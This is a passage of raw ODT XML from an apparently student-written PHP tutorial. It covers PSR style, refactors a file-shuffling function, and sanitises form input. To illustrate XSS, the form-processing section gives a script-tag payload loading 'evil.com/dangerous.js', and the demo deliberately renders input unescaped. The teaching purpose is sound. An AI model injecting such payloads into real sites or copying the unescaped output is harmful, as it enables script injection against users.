      <text:p text:style-name="P81"><text:tab/><text:span text:style-name="T72">That wasn“t even a tip of the iceberg of PHP high level opportunities. But I think that such demonstratoin of base types data processing is enough to realize that PHP is actually pleasant writing language full of fast built-in solutions.</text:span></text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P3"><text:span text:style-name="T73">3.</text:span><text:span text:style-name="T66">Writing style</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T66"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1935_379528241"/><text:span text:style-name="T66">Single style of coding is probably the main pillar of perspective company, productive team and successful programmer. PHP is one of few (or even the only one) </text:span><text:span text:style-name="T77">of</text:span><text:span text:style-name="T66"> modern actual languages which has single standar</text:span><text:span text:style-name="T77">d</text:span><text:span text:style-name="T66"> of how to write code on it. It is called PSR and there are some rumors that reading and learning this Bible of any experienced PHP developer not only </text:span><text:span text:style-name="T74">improves the quality of your code and makes your team-mates much more kind and friendly when they are forced to work with your code but increase testosterone and IQ level. Generally this is something that must be read.</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T75"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1937_379528241"/><text:span text:style-name="T76">Ta</text:span><text:bookmark-end text:name="__DdeLink__1935_379528241"/><text:span text:style-name="T76">lking of more abstract ideas than code details and </text:span><text:span text:style-name="T33">specialties the main think I</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T33">ve realized is that your code should be created like a puzzle: instead of writing monolithic pile of code try to create a composite model. Your functions (methods, classes etc) are like a lego-cubes: the best and the most flexible building is created only of tiny parts. That“s why you can replace your roof by the next floor when it</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T33">s time for </text:span><text:span text:style-name="T34">the expansion</text:span><text:span text:style-name="T33">.</text:span><text:bookmark-end text:name="__DdeLink__1937_379528241"/></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/><text:span text:style-name="T33"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1939_379528241"/><text:bookmark-start text:name="__DdeLink__1943_379528241"/><text:span text:style-name="T40">Lets have a look on the</text:span><text:span text:style-name="T34"> continuation of my idea on the example. We need soft which shake the contents of file: </text:span><text:span text:style-name="T40">interchanges lines</text:span><text:span text:style-name="T34"> </text:span><text:span text:style-name="T35">and informs how much of them were in it.</text:span><text:bookmark-end text:name="__DdeLink__1939_379528241"/><text:bookmark-end text:name="__DdeLink__1943_379528241"/></text:p>
      <text:p text:style-name="P99"><text:bookmark-start text:name="__DdeLink__1941_379528241"/><text:span text:style-name="T90">function </text:span><text:span text:style-name="T118">shuffleFileNewbie</text:span><text:span text:style-name="T35">(</text:span><text:span text:style-name="T100">$filename</text:span><text:span text:style-name="T35">)</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$a</text:span><text:span text:style-name="T130">= file_get_contents(</text:span><text:span text:style-name="T133">$filename</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$b</text:span><text:span text:style-name="T130">= </text:span><text:span text:style-name="T173">0 </text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$l </text:span><text:span text:style-name="T130">=[]</text:span><text:span text:style-name="T145">; </text:span><text:span text:style-name="T188">//lines</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">for </text:span><text:span text:style-name="T130">(</text:span><text:span text:style-name="T133">$i </text:span><text:span text:style-name="T130">= </text:span><text:span text:style-name="T173">0</text:span><text:span text:style-name="T145">; </text:span><text:span text:style-name="T133">$i </text:span><text:span text:style-name="T130">&lt; strlen(</text:span><text:span text:style-name="T133">$a</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">; </text:span><text:span text:style-name="T133">$i</text:span><text:span text:style-name="T130">++)</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if</text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T136">$a </text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T136">$i</text:span><text:span text:style-name="T180">] != </text:span><text:span text:style-name="T143">"</text:span><text:span text:style-name="T148">\n</text:span><text:span text:style-name="T143">"</text:span><text:span text:style-name="T180">)</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$l </text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T136">$b</text:span><text:span text:style-name="T180">] .= </text:span><text:span text:style-name="T136">$a</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T136">$i</text:span><text:span text:style-name="T180">]</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">else </text:span><text:span text:style-name="T136">$b</text:span><text:span text:style-name="T180">++ </text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">var_dump(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$l </text:span><text:span text:style-name="T130">= myOwnShuffle(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$new_l </text:span><text:span text:style-name="T130">= </text:span><text:span text:style-name="T140">""</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">for</text:span><text:span text:style-name="T130">(</text:span><text:span text:style-name="T133">$i</text:span><text:span text:style-name="T130">=</text:span><text:span text:style-name="T173">0</text:span><text:span text:style-name="T145">; </text:span><text:span text:style-name="T133">$i </text:span><text:span text:style-name="T130">&lt; count(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T130">) </text:span><text:span text:style-name="T145">; </text:span><text:span text:style-name="T133">$i</text:span><text:span text:style-name="T130">++)</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$new_l </text:span><text:span text:style-name="T180">.= </text:span><text:span text:style-name="T136">$l</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T136">$i</text:span><text:span text:style-name="T180">] . </text:span><text:span text:style-name="T143">"</text:span><text:span text:style-name="T148">\n</text:span><text:span text:style-name="T143">"</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">file_put_contents(</text:span><text:span text:style-name="T133">$filename </text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T133">$new_l</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">echo </text:span><text:span text:style-name="T130">count(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__1941_379528241"/></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T35"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1945_379528241"/><text:span text:style-name="T35">T</text:span><text:span text:style-name="T31">his code is working. But it is not readable, not safe, not extensible and just ugly without any excuses. To fix the trouble I</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T31">m to follow simple set of rules:</text:span><text:bookmark-end text:name="__DdeLink__1945_379528241"/></text:p>
      <text:list xml:id="list7635533508112934906" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P138"><text:bookmark-start text:name="__DdeLink__1955_379528241"/>Refactor it according the PSR<text:bookmark-end text:name="__DdeLink__1955_379528241"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P150"><text:bookmark-start text:name="__DdeLink__1957_379528241"/><text:span text:style-name="T31">Use built-in short succinct </text:span><text:span text:style-name="T37">and safe</text:span><text:span text:style-name="T31"> </text:span><text:span text:style-name="T36">functions instead of writing my own ones</text:span><text:bookmark-end text:name="__DdeLink__1957_379528241"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P151"><text:bookmark-start text:name="__DdeLink__1959_379528241"/><text:span text:style-name="T31">Name the variables with meaningful long </text:span><text:span text:style-name="T40">enough</text:span><text:span text:style-name="T31"> nouns</text:span><text:bookmark-end text:name="__DdeLink__1959_379528241"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P150"><text:bookmark-start text:name="__DdeLink__1961_379528241"/><text:span text:style-name="T31">Add strict types to make code more sa</text:span><text:span text:style-name="T37">f</text:span><text:span text:style-name="T31">e and protect from </text:span><text:span text:style-name="T37">unexpected</text:span><text:span text:style-name="T31"> variables</text:span><text:bookmark-end text:name="__DdeLink__1961_379528241"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P100"><text:bookmark-start text:name="__DdeLink__1947_379528241"/><text:span text:style-name="T89">function </text:span><text:span text:style-name="T117">shuffleFileAmateur</text:span><text:span text:style-name="T31">(string </text:span><text:span text:style-name="T99">$filename</text:span><text:span text:style-name="T31">): int</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$lines </text:span><text:span text:style-name="T180">= file(</text:span><text:span text:style-name="T136">$filename</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T180">shuffle(</text:span><text:span text:style-name="T136">$lines</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$shuffledContents </text:span><text:span text:style-name="T180">= implode(</text:span><text:span text:style-name="T143">""</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T136">$lines</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T180">file_put_contents(</text:span><text:span text:style-name="T136">$filename</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T136">$shuffledContents</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T180">count(</text:span><text:span text:style-name="T136">$lines</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__1947_379528241"/></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P15"><text:span text:style-name="T31"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1949_379528241"/><text:span text:style-name="T37">T</text:span><text:span text:style-name="T40">h</text:span><text:span text:style-name="T37">at one is much more better. But it still has few obvious vulnerabilities connected with working with file system. Let</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T37">s add some verifications to control the success of execution of this brick of code.</text:span><text:bookmark-end text:name="__DdeLink__1949_379528241"/></text:p>
      <text:p text:style-name="P102"><text:bookmark-start text:name="__DdeLink__1951_379528241"/><text:span text:style-name="T83">function </text:span><text:span text:style-name="T116">shuffleFile</text:span><text:span text:style-name="T41">(string </text:span><text:span text:style-name="T98">$filename</text:span><text:span text:style-name="T41">): int</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">false </text:span><text:span text:style-name="T180">=== </text:span><text:span text:style-name="T136">$lines </text:span><text:span text:style-name="T180">= file(</text:span><text:span text:style-name="T136">$filename</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T180">-</text:span><text:span text:style-name="T174">1</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T180">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T180">shuffle(</text:span><text:span text:style-name="T136">$lines</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$shuffledContents </text:span><text:span text:style-name="T180">= implode(</text:span><text:span text:style-name="T143">""</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T136">$lines</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">false </text:span><text:span text:style-name="T180">=== file_put_contents(</text:span><text:span text:style-name="T136">$filename</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T136">$shuffledContents</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T180">-</text:span><text:span text:style-name="T174">1</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T180">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T180">count(</text:span><text:span text:style-name="T136">$lines</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__1951_379528241"/></text:p>
      <text:p text:style-name="P16"><text:soft-page-break/><text:span text:style-name="T37"><text:tab/></text:span><text:span text:style-name="T31">Much better. Now we can check the success of execution our part of code after call and react the way we want.</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T31"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1964_379528241"/><text:span text:style-name="T38">When you are to write your own function except it should meet the requirements of the PSR be short and safe you should think of the way you are passing your parameters: by value or by reference. The first variant is more appropriate in ordinary situations. You just get a copy of your real parameter, th</text:span><text:span text:style-name="T40">e</text:span><text:span text:style-name="T38">n process it and after that you return tham. This way is more wide-spread, </text:span><text:span text:style-name="T40">predictable</text:span><text:span text:style-name="T38"> and maybe even safe. But the second way is better in case you are working with a huge data volume or call the function really often: you don</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T38">t create and contain enormous count of data that</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T38">s why it works faster.</text:span><text:bookmark-end text:name="__DdeLink__1964_379528241"/></text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P4"><text:span text:style-name="T38">4.</text:span><text:span text:style-name="T31">Forms Processing</text:span></text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T44"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__2535_1458108310"/><text:span text:style-name="T44">Integral part of the majority of serious web-sites are forms and form processing. Good form should look simple and clear. That is a front end team issue. And concerning the back end part of a project th</text:span><text:span text:style-name="T45">e</text:span><text:span text:style-name="T44">re should be lots of job. </text:span><text:span text:style-name="T43">Besides the processing of correct user input variables and </text:span><text:span text:style-name="T45">interaction with a database it is necessary to protect source from so called «malicious scripts»: XSS</text:span><text:span text:style-name="T43"> attacs (HTML and JS injections), SQL injections and other attacs which can be directed on </text:span><text:span text:style-name="T45">stealing</text:span><text:span text:style-name="T43"> the passwords, private information, virus scripts </text:span><text:span text:style-name="T45">spread</text:span><text:span text:style-name="T43"> and even just </text:span><text:span text:style-name="T45">destroying</text:span><text:span text:style-name="T43"> the database. Such disasters can move from one source to another so it is really important to set the sanitation behind each form.</text:span><text:bookmark-end text:name="__DdeLink__2535_1458108310"/></text:p>
      <text:p text:style-name="P84"><text:span text:style-name="T43"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__2562_1458108310"/><text:span text:style-name="T46">I</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T46">m using Twig template engine in this project which has default html-entities shielting. That</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T46">s why for demonstration I display parameters with «raw» filter. </text:span><text:span text:style-name="T51">Also in the form above there is a regular expression checking up in Department id input. This thing is really useful and simple sometimes.</text:span><text:bookmark-end text:name="__DdeLink__2562_1458108310"/></text:p>
      <text:p text:style-name="P122"><text:bookmark-start text:name="__DdeLink__2548_1458108310"/><text:span text:style-name="T88">private const </text:span><text:span text:style-name="T106">NAME_INVALID_MESSAGE </text:span><text:span text:style-name="T65">= </text:span><text:span text:style-name="T112">"Name should contain only english letters."</text:span><text:span text:style-name="T93">;</text:span></text:p>
      <text:p text:style-name="P103"><text:span text:style-name="T85">private function </text:span><text:span text:style-name="T119">processName</text:span><text:span text:style-name="T62">(?string </text:span><text:span text:style-name="T101">$name</text:span><text:span text:style-name="T62">): </text:span><text:span text:style-name="T85">array</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$processedNameArray </text:span><text:span text:style-name="T180">= []</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">isset</text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T136">$name</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedNameArray</text:span><text:span text:style-name="T180">[] = !</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$name</text:span><text:span text:style-name="T180">)) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T136">$name </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW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36">$isValid </text:span><text:span text:style-name="T180">= ctype_alpha(</text:span><text:span text:style-name="T136">$name</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedNameArray</text:span><text:span text:style-name="T180">[] = (</text:span><text:span text:style-name="T136">$isValid</text:span><text:span text:style-name="T180">) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">VALID_MESSAGE </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">NAME_INVALID_MESSAGE</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(!</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$name</text:span><text:span text:style-name="T180">))) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedNameArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED </text:span><text:span text:style-name="T180">. filter_var(</text:span><text:span text:style-name="T136">$name</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T137">FILTER_SANITIZE_STRING</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T180">} </text:span><text:span text:style-name="T149">else </text:span><text:span text:style-name="T180">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedNameArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED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80">}</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T136">$processedNameArray</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__2548_1458108310"/></text:p>
      <text:list xml:id="list5942391181512660803" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P152"><text:bookmark-start text:name="__DdeLink__2591_1458108310"/><text:span text:style-name="T47">When working with POST check up, is there a POST value with this key. In this method I</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T47">m getting something like $_POST[</text:span><text:span text:style-name="T58">'name'</text:span><text:span text:style-name="T47">] but it</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T47">s possible that there wasn</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T47">t such name attribute value on a form input or someone changed something.</text:span><text:bookmark-end text:name="__DdeLink__2591_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P152"><text:bookmark-start text:name="__DdeLink__2593_1458108310"/><text:soft-page-break/><text:span text:style-name="T47">Than I</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T47">m just displaying raw data. Without any validation. What can go wrong?) You are writing your name like «</text:span><text:span text:style-name="T58">Michael</text:span><text:span text:style-name="T47">» and everything works?) Well try to write this way: «&lt;b&gt;</text:span><text:span text:style-name="T58">Michael</text:span><text:span text:style-name="T47">&lt;/b&gt;». As you can see you have just entered the inner structure of the page and this is what really unacceptable. Write this way «&lt;input type=“text“ name=“id“ placeholder=security_hole&gt;». </text:span><text:span text:style-name="T48">I can not even imagine how much damage you can make via this newborn input. </text:span><text:span text:style-name="T49">There you can also </text:span><text:span text:style-name="T50">put smth like «</text:span><text:span text:style-name="T123">&lt;</text:span><text:span text:style-name="T124">script</text:span><text:span text:style-name="T123"> </text:span><text:span text:style-name="T125">src</text:span><text:span text:style-name="T123">=</text:span><text:span text:style-name="T126">"http://evil.com/dangerous.js"</text:span><text:span text:style-name="T123"> </text:span><text:span text:style-name="T125">type</text:span><text:span text:style-name="T123">=</text:span><text:span text:style-name="T126">"text/javascript"</text:span><text:span text:style-name="T123"> </text:span><text:span text:style-name="T125">charset</text:span><text:span text:style-name="T123">=</text:span><text:span text:style-name="T126">"utf-8"</text:span><text:span text:style-name="T123">&gt;&lt;/</text:span><text:span text:style-name="T124">script</text:span><text:span text:style-name="T123">&gt;</text:span><text:span text:style-name="T50">». I don</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T50">t need to explain.</text:span><text:bookmark-end text:name="__DdeLink__2593_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P153"><text:bookmark-start text:name="__DdeLink__2595_1458108310"/><text:span text:style-name="T50">T</text:span><text:span text:style-name="T42">han I</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T42">m checking up the input data format with a help of «ctype» family m</text:span><text:span text:style-name="T59">e</text:span><text:span text:style-name="T42">meber ctype_alpha which admits only english alphabet letters. You can also use this smart function-group to check only numbers, only numbers and digits, only upper and only lower letters and few more things.</text:span><text:bookmark-end text:name="__DdeLink__2595_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P139"><text:bookmark-start text:name="__DdeLink__2597_1458108310"/>And finally I display shielted data with a help of built-in function filter_var and an suitable key which blocks any html-entity and danger symbol. In case you want to process something more simple than name like email there are some keys for it.<text:bookmark-end text:name="__DdeLink__2597_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P104"><text:bookmark-start text:name="__DdeLink__2550_1458108310"/><text:span text:style-name="T86">private const </text:span><text:span text:style-name="T107">EMAIL_INVALID_MESSAGE </text:span><text:span text:style-name="T63">= </text:span><text:span text:style-name="T113">"Email should have postfix."</text:span><text:span text:style-name="T94">;</text:span></text:p>
      <text:p text:style-name="P104"><text:span text:style-name="T86">private function </text:span><text:span text:style-name="T120">processEmail</text:span><text:span text:style-name="T63">(?string </text:span><text:span text:style-name="T102">$email</text:span><text:span text:style-name="T63">): </text:span><text:span text:style-name="T86">array</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$processedEmailArray </text:span><text:span text:style-name="T180">= []</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">isset</text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T136">$email</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedEmailArray</text:span><text:span text:style-name="T180">[] = !</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$email</text:span><text:span text:style-name="T180">)) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T136">$email </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW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36">$isValid </text:span><text:span text:style-name="T180">= filter_input(</text:span><text:span text:style-name="T137">INPUT_POST</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T143">"email"</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T137">FILTER_VALIDATE_EMAIL</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedEmailArray</text:span><text:span text:style-name="T180">[] = (</text:span><text:span text:style-name="T136">$isValid</text:span><text:span text:style-name="T180">) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">VALID_MESSAGE </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">EMAIL_INVALID_MESSAGE</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(!</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$email</text:span><text:span text:style-name="T180">))) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedEmailArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED </text:span><text:span text:style-name="T180">. filter_var(</text:span><text:span text:style-name="T136">$email</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T137">FILTER_SANITIZE_EMAIL</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T180">} </text:span><text:span text:style-name="T149">else </text:span><text:span text:style-name="T180">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedEmailArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED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80">}</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T136">$processedEmailArray</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__2550_1458108310"/></text:p>
      <text:p text:style-name="P49"/>
      <text:list xml:id="list3569371621916389838" text:style-name="L6">
        <text:list-item>
